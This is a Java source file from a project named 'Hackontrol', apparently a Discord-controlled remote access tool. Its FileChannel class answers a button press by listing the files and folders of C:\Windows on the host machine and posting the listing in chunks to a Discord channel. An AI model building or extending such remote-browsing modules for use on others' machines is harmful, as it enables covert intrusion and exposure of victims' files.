package com.khopan.hackontrol.channel.file;

import java.io.BufferedReader;
import java.io.File;
import java.io.StringReader;
import java.util.ArrayList;
import java.util.List;

import com.khopan.hackontrol.HackontrolChannel;
import com.khopan.hackontrol.manager.button.ButtonInteraction;
import com.khopan.hackontrol.manager.button.ButtonManager;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.utils.ErrorUtils;

import net.dv8tion.jda.api.entities.channel.unions.MessageChannelUnion;
import net.dv8tion.jda.api.events.interaction.component.ButtonInteractionEvent;
import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
import net.dv8tion.jda.api.requests.restaction.MessageCreateAction;
import net.dv8tion.jda.api.requests.restaction.interactions.ReplyCallbackAction;
import net.dv8tion.jda.api.utils.messages.MessageCreateRequest;

public class FileChannel extends HackontrolChannel {
	private static final String CHANNEL_NAME = "file";

	private static final String QUERY_FILE_BUTTON_IDENTIFIER = "queryFile";

	private final List<FileEntry> fileList;

	private File filePointer;

	public FileChannel() {
		this.fileList = new ArrayList<>();
	}

	@Override
	public String getName() {
		return FileChannel.CHANNEL_NAME;
	}

	@Override
	public void initialize() {
		this.channel.sendMessageComponents(ActionRow.of(ButtonManager.staticButton(ButtonStyle.SUCCESS, "Query File", FileChannel.QUERY_FILE_BUTTON_IDENTIFIER))).queue();
	}

	@Override
	public void register(Registry registry) {
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, FileChannel.QUERY_FILE_BUTTON_IDENTIFIER, this :: query);
	}

	private void query(ButtonInteraction interaction) {
		this.filePointer = new File("C:\\Windows");
		StringBuilder builder = new StringBuilder();
		File[] files = this.filePointer == null ? File.listRoots() : this.filePointer.listFiles();

		if(files == null || files.length == 0) {
			ErrorUtils.sendErrorReply(interaction, new InternalError("Empty file list"));
			return;
		}

		List<File> fileList = new ArrayList<>();
		List<File> folderList = new ArrayList<>();

		for(int i = 0; i < files.length; i++) {
			File file = files[i];

			if(!file.exists()) {
				continue;
			}

			if(file.isFile()) {
				fileList.add(file);
			}

			if(file.isDirectory()) {
				folderList.add(file);
			}
		}

		if(fileList.isEmpty() && folderList.isEmpty()) {
			ErrorUtils.sendErrorReply(interaction, new InternalError("No files available"));
			return;
		}

		int ordinal = 1;
		builder.append("**");
		builder.append(this.filePointer == null ? "SYSTEMROOT" : this.filePointer.getAbsolutePath().replace("\\", "\\\\"));
		builder.append("**");
		this.fileList.clear();

		if(!fileList.isEmpty()) {
			builder.append("\n**File**");

			for(int i = 0; i < fileList.size(); i++) {
				FileEntry entry = new FileEntry();
				entry.ordinal = ordinal++;
				entry.file = fileList.get(i);
				this.fileList.add(entry);
				builder.append('\n');
				builder.append(entry.ordinal);
				builder.append(") `");
				builder.append(entry.file.getName());
				builder.append('`');
			}
		}

		if(!folderList.isEmpty()) {
			builder.append("\n**Folder**");

			for(int i = 0; i < folderList.size(); i++) {
				FileEntry entry = new FileEntry();
				entry.ordinal = ordinal++;
				entry.file = folderList.get(i);
				this.fileList.add(entry);
				builder.append('\n');
				builder.append(entry.ordinal);
				builder.append(") `");
				builder.append(entry.file.getName());
				builder.append('`');
			}
		}

		BufferedReader reader = new BufferedReader(new StringReader(builder.toString()));
		builder = new StringBuilder();
		List<String> messageList = new ArrayList<>();
		String line;

		try {
			while((line = reader.readLine()) != null) {
				line += '\n';

				if(builder.length() + line.length() > 2000) {
					messageList.add(builder.toString());
					builder = new StringBuilder();
				}

				builder.append(line);
			}

			if(!builder.isEmpty()) {
				messageList.add(builder.toString());
			}
		} catch(Throwable Errors) {
			ErrorUtils.sendErrorReply(interaction, Errors);
			return;
		}

		ButtonInteractionEvent Event = interaction.getEvent();
		MessageChannelUnion channel = Event.getChannel();
		String firstBatch = messageList.get(0);
		messageList.remove(0);
		ReplyCallbackAction replyCallbackAction = Event.reply(firstBatch);

		if(messageList.isEmpty()) {
			this.configActionRow(replyCallbackAction);
			replyCallbackAction.queue(ButtonManager :: dynamicButtonCallback);
			return;
		}

		replyCallbackAction.queue(hook -> {
			ButtonManager.dynamicButtonCallback(hook);
			hook.retrieveOriginal().queue(message -> new Thread(() -> {
				int size = messageList.size();
				MessageCreateAction messageCreateAction;

				if(size == 1) {
					messageCreateAction = channel.sendMessage(messageList.get(0));
					this.configActionRow(messageCreateAction, message.getIdLong());
				} else {
					Object[] identifierList = new Object[size];
					identifierList[0] = message.getIdLong();

					for(int i = 1; i < size; i++) {
						identifierList[i] = channel.sendMessage(messageList.get(i - 1)).complete().getIdLong();
					}

					messageCreateAction = channel.sendMessage(messageList.get(size - 1));
					this.configActionRow(messageCreateAction, identifierList);
				}

				messageCreateAction.queue(ButtonManager :: dynamicButtonCallback);
			}).start());
		});
	}

	private void configActionRow(MessageCreateRequest<?> request, Object... messageIdentifiers) {
		request.addActionRow(ButtonManager.selfDelete(ButtonStyle.DANGER, "Delete", messageIdentifiers));
	}

	private static class FileEntry {
		private int ordinal;
		private File file;
	}
}
